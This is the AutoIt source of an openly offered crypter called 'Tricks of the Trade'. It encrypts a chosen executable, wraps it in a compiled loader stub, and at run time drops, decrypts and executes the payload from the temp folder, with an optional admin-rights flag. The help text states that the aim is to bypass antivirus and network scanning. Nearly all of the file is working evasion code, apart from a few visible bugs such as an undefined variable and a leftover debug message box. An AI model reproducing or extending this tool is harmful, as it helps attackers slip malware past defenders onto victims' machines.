;Trick of the trade -- Encrypted file loader and unloader to bypass detection.
;   Written by TRAGENALPHA
;   12:19PM -- 26/12/2017
; The 'cryptlib.au3' file is a combination of FileConstants.au3 and Crypt.au3

;NOTE : Remove the message box library before release
;TODO : AutoIt can only handle 4000 > char in lines make sure given key length doesn't exceed or use _ to create continuation.

#NoTrayIcon
#include <lib\cryptlib.au3>
#include <lib\consolemodify.au3>
#include <lib\createkey.au3>
#include <MsgBoxConstants.au3>

Global $bnum = "0001"
Global $envargs

Global $argfilein = ""
Global $argfileout = ""
Global $argarch = "x86"
Global $argencrypt = $CALG_AES_128
Global $argico = ""
Global $genkey
Global $execflnm
Global $reqadmn = false

Global $tmpdir = @TempDir & "\tott"

coutl("/----------------\ -----------------------------------------------")
coutl("|     /\  /\     | Tricks of the Trade b#" & $bnum)
coutl("|   _/  \/  \_   |   File encrypter, loader and")
coutl("|  // _\ /_  \\  |   unloader to bypass detection.")
coutl("| / \ *   *  / \ | -----------------------------------------------")
coutl("| \  \  ^   /  / | https://github.com/tragenalpha/tricksofthetrade")
coutl("|6_\_ \..../ _/_6| -----------------------------------------------")
coutl("| \ .\|.\/.|/. / |                   (c) <bear>Softwares</trap>")
coutl("\----------------/ -----------------------------------------------")

If $Cmdline[0] = 0 Then
  coutl("Please run the program in a command line supplied with arguments and it's respective parameters")
  coutl("Use the --help to show the help dialogue")
  error("supplied argument is 0")
ElseIf $Cmdline[1] = "--help" Then
  coutl("Tricks of the Trade build # " & $bnum & " // Developed by: TRAGENALPHA // [beartrap]")
  coutl("tragenalpha@protonmail.com ## https://tragenalpha.github.io")
  coutl("")
  coutl("Encrypts your binary file and embeds them to an executable to bypass detection.")
  coutl(" *Arguments that are given to the carrier are passed to the embedded executable")
  coutl(" *This will not guarantee a FUD / bypass. The original executable is fully untouched and is later")
  coutl(" dropped and executed. This will mostly be useful to bypass online / network scanners")
  coutl(" *Only executable binaries is allowed to be imported (*.exe)")
  coutl(" *Decrypted executable is dropped in the common temporary folder")
  coutl(" *software comes bundled with aghanim's scepter provided by a weird pink midget")
  coutl("")
  coutl("Usage: tott.exe [mode] -e [encryption] -a [architecture] -ico [file] -i [file in] -o [file out] -kl [integer] -requireadmin")
  coutl(" * [mode] should always be the first argument given")
  coutl("")
  coutl("[mode] :: Sets the mode of the application")
  coutl("--help :: shows the help dialogue")
  coutl("--load  :: Encrypt and load a file ")
  coutl("--cleanup :: clear up space by deleting all the temporary files")
  coutl("")
  coutl("[load arguments]")
  coutl("-i [file in] :: File path of the file to be loaded and encrypted")
  coutl("-e [encryption] :: Encryption to use :: 3des, aes128, aes192, aes256, des, rc2, rc4 :: Default encryption aes128")
  coutl("-o [file out] :: File output destination after encryption and file load process")
  coutl("-a [architecture] :: Compiled executable architecture :: x86, x64 :: Default architecture x86")
  coutl("-ico [file] :: Compiled executable icon :: Default icon [blank icon]")
  coutl("-kl [integer] :: Key length to be used for the encryption :: Default length 64")
  coutl("-requireadmin :: Flags the compiled application to require administrative priviledges")
  Exit
ElseIf $Cmdline[1] = "--load" Then
  If $Cmdline[0] = 1 Then error("insufficient arguments")
  $envargs = $Cmdline[2]
  For $i = 3 to $Cmdline[0]
    $envargs = $envargs & " " & $Cmdline[$i]
  Next
  
  coutw("Checking for temporary directory... ")
  If FileExists($tmpdir) Then
    coutl("OK!")
  Else
    coutw("Creating... ")
    If DirCreate($tmpdir) Then
      coutl("DONE!")
    Else
      coutl("FAILED!")
      error("cannot create temporary folder")
    EndIf
  EndIf

  coutw("Checking for compiler... ")
  If FileExists($tmpdir & "\aicompiler.exe") Then
    coutl("OK!")
  Else
    coutw("Dropping... ")
    If FileInstall("C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2exe.exe", $tmpdir & "\aicompiler.exe") Then
      coutl("DONE!")
    Else
      coutl("FAILED!")
      error("cannot drop compiler")
    EndIf
  EndIf

  coutw("Checking for compressor... ")
  If FileExists($tmpdir & "\upx.exe") Then
    coutl("OK!")
  Else
    coutw("Dropping... ")
    If FileInstall("C:\Program Files (x86)\AutoIt3\Aut2Exe\upx.exe", $tmpdir & "\upx.exe") Then
      coutl("DONE!")
    Else
      coutl("FAILED!")
      error("cannot drop compressor")
    EndIf
  EndIf

  coutw("Checking crypto library... ")
  If FileExists($tmpdir & "\lib\cryptlib.au3") Then
    coutl("OK!")
  Else
    coutw("Dropping... ")
    DirCreate($tmpdir & "\lib")
    If FileInstall("lib\cryptlib.au3", $tmpdir & "\lib\cryptlib.au3") Then
      coutl("DONE!")
    Else
      coutl("FAILED!")
      error("cannot drop cryplib")
    EndIf
  EndIf
  Call("initializeargs")
ElseIf $Cmdline[1] = "--cleanup" Then
  Call("cleanup")
Else
  error("invalid mode")
EndIf

Func initializeargs()
  coutl("Initializing arguments... :: " & $envargs)
  For $bdvty in StringSplit($envargs, "-", 2)
    If $bdvty = "" = False Then
      Local $gsvrt = StringSplit($bdvty, " ", 2)

      Switch ($gsvrt[0])

      Case "i"
        If UBound($gsvrt) <= 1 Then error("insufficient parameter")
        coutw("arg::in::" & $gsvrt[1] & "::")
        If FileExists($gsvrt[1]) and StringRight($gsvrt[1], 4) = ".exe" Then
          $argfilein = $gsvrt[1]
          Local $sbys = StringSplit($gsvrt[1], "\", 2)
          $execflnm = StringTrimRight($sbys[UBound($sbys) - 1], 4)
          coutl("OK!")
        Else
          coutl("ERROR!")
          error("file does not exist or is not a binary")
        EndIf

      Case "e"
        If UBound($gsvrt) <= 1 Then error("insufficient parameter")
        coutw("arg::encryption::" & $gsvrt[1] & "::")
        If $gsvrt[1] = "3des" or $gsvrt[1] = "aes128" or $gsvrt[1] = "aes192" or $gsvrt[1] = "aes256" or $gsvrt[1] = "des" or $gsvrt[1] = "rc2" or $gsvrt[1] = "rc4" Then
          coutl("OK!")
          Switch($gsvrt[1])
            Case "3des"
              $argencrypt = $CALG_3DES
            Case "aes128"
              $argencrypt = $CALG_AES_128
            Case "aes192"
              $argencrypt = $CALG_AES_192
            Case "aes256"
              $argencrypt = $CALG_AES_256
            Case "des"
              $argencrypt = $CALG_DES
            Case "rc2"
              $argencrypt = $CALG_RC2
            Case "rc4"
              $argencrypt = $CALG_RC4
          EndSwitch
        Else
          coutl("ERROR!")
          error("unknown encryption type")
        EndIf

      Case "o"
        If UBound($gsvrt) <= 1 Then error("insufficient parameter")
        coutw("arg::out::" & $gsvrt[1] & "::")
        If FileExists($gsvrt[1]) = False Then
          $argfileout = $gsvrt[1]
          coutl("OK!")
        Else
          coutl("ERROR!")
          error("out file name already exists")
        EndIf

      Case "a"
        If UBound($gsvrt) <= 1 Then error("insufficient parameter")
        coutw("arg::architecture::" & $gsvrt[1] & "::")
         If $gsvrt[1] = "x86" or $gsvrt[1] = "x64" Then
          $argarch = $gsvrt[1]
          coutl("OK!")
        Else
          coutl("ERROR!")
          error("unknown architecture type")
        EndIf

      Case "ico"
        If UBound($gsvrt) <= 1 Then error("insufficient parameter")
        coutw("arg::icon::" & $gsvrt[1] & "::")
        If FileExists($gsvrt[1]) and StringRight($gsvrt[1], 4) = ".ico" Then
          $argico = $gsvrt[1]
          coutl("OK!")
        Else
          coutl("ERROR!")
          error("file does not exists or is not an image/graphic")
        EndIf

      Case "kl"
        stgenkey($gsvrt[1])

      Case "requireadmin"
        $reqadmn = true
        coutl("requireadmin::flag::true")
      Case Else
        error('supplied argument:' & $gsvrt[0])
      EndSwitch
    EndIf
  Next

  If $genkey = "" Then
    coutl("Generating key with length of 64...")
    stgenkey(64)
  EndIf

  coutw("Validating... ")
  If $argfilein = "" and $argfileout = "" Then
    coutl("ERROR!")
    error("-i and -o aren't optional argument and should be supplied")
  Else
    coutl("OK!")
    Call("phase1")
  EndIf
EndFunc

Func phase1()
  coutw("Copying input file... ")
  If FileCopy($argfilein, $tmpdir & "\$tmp.exe", 1) Then
    coutl("DONE!")
  Else
    coutl("FAILED!")
    error("failed to copy file")
  EndIf

  If $argico = "" = False Then
    coutw("Copying icon... ")
    If FileCopy($argico, $tmpdir & "\$tmp.ico", 1) Then
      coutl("DONE!")
    Else
      coutl("FAILED!")
      error("failed to copy file")
    EndIf
  EndIf

  coutw("Encrypting binary... ")
  If _Crypt_EncryptFile($tmpdir & "\$tmp.exe", $tmpdir & "\$tmp._tot", $genkey, $argencrypt) Then
    coutl("Done!")
  Else
    coutl("Failed!")
    error("cannot encrypt binary file")
  EndIf

  coutw("Writing script... ")
  Local $chunk
  $chunk = '#NoTrayIcon' & @crlf & '#include <lib\cryptlib.au3>' & @crlf & 'Global $filename = "' & $execflnm & '"' & @crlf & 'Global $finalargs = ""' & @crlf & 'Global $key = "' & $genkey & '"' & @crlf & 'Global $algo = ' & $argencrypt & @crlf & 'If $Cmdline[0] > 0 Then' & @crlf & 'For $i = 1 to Ubound($Cmdline) - 1' & @crlf & 'If $finalargs = "" Then' & @crlf & '$finalargs = $Cmdline[1]' & @crlf & 'Else' & @crlf & '$finalargs &= " " & $Cmdline[$i]' & @crlf & 'EndIf' & @crlf & 'Next' & @crlf & 'EndIf' & @crlf & 'If FileExists(@TempDir & "\" & $filename & ".exe") = False Then' & @crlf & 'FileInstall("$tmp._tot", @TempDir & "\" & $filename & "._tot", 1)' & @crlf & '_Crypt_DecryptFile(@TempDir & "\" & $filename & "._tot", @TempDir & "\" & $filename & ".exe", $key, $algo)' & @crlf & 'execfile()' & @crlf & 'Else' & @crlf & 'execfile()' & @crlf & 'EndIf' & @crlf & 'Func execfile()' & @crlf & 'ShellExecute(@TempDir & "\" & $filename & ".exe", $finalargs)' & @crlf & 'EndFunc'
  If $reqadmn Then $chunk = "#RequireAdmin" & @crlf & $chunk
  coutw("Creating file handler... ")
  Local $sdgvsr = FileOpen($tmpdir & "\payload.au3", 2)
  If $sdgvsr = -1 Then
    coutl("FAILED!")
    error("cannot create file handler")
  EndIf
  coutw("Writing to handler... ")
  If FileWrite($sdgvsr, $chunk) Then
    coutw("Closing handler... ")
    If FileClose($sdgvsr) Then
      coutl("DONE!")
    Else
      coutl("FAILED!")
      error("failed to close file handler")
    EndIf
  Else
    coutl("FAILED!")
    error("cannot write data to handler")
  EndIf

  coutw("Compiling...")
  Local $comarg = '/in payload.au3' & ' /out "' & $argfileout & '" /comp 4 /pack'
  msgbox(0, "", $comarg)
  If $argico = "" = False Then $comarg &= ' /ico "' & $argico & '"'
  ShellExecute($tmpdir & "\aicompiler.exe", $comarg)
  If $hndlreturn = 0 Then
    coutl("Complete!")
  EndIf
EndFunc

Func stgenkey($length)
  coutw("Generating key::length::" & $length & "::")
  If $length >= 8 Then
    $genkey = createkey($length)
    coutl("Done!")
    coutl("-----")
    coutl($genkey)
    coutl("-----")
  Else
    coutl("ERROR!")
    error("-kl parameter is not a number or below 8")
  EndIf
EndFunc

Func cleanup()
  coutw("Cleaning up... ")
  If FileExists($tmpdir) Then
    If DirRemove($tmpdir, 1) Then
      coutl("Done!")
    Else
      coutl("Failed!")
      error("cannot delete temporary directory")
    EndIf
  Else
    coutl("ERROR!")
    error("nothing to clean")
  EndIf
EndFunc